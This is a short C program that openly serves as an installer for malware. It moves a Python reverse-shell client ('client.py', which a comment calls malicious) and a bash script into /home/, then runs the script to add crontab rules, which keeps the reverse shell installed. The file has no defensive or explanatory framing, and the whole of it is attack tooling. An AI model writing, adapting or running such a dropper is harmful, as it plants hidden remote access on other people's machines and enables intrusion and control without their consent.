#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main(){
    char command_for_move_reverse_shell[1024];
    char command_for_move_bash_script[1024];
    char reverse_shell_path[1024];
    char add_rules_for_crontab[1024];

    //Get Path Folder

    if(getcwd(reverse_shell_path,sizeof(reverse_shell_path)) != NULL){
        printf("%s\n",reverse_shell_path);
    }

    //Move malcious python script in other folder
    sprintf(command_for_move_reverse_shell, "mv %s/client.py /home/", reverse_shell_path);
    system(command_for_move_reverse_shell);
    printf("[+] Reverse shell file transferd\n");

    //Move bash script in other folder
    sprintf(command_for_move_bash_script, "mv %s/settings.sh /home/", reverse_shell_path);
    system(command_for_move_bash_script);
    printf("[+] Bash script transferd\n");

    //Run bash script for add rules in Crontab
    sprintf(add_rules_for_crontab, "bash /home/settings.sh");
    system(add_rules_for_crontab);

}
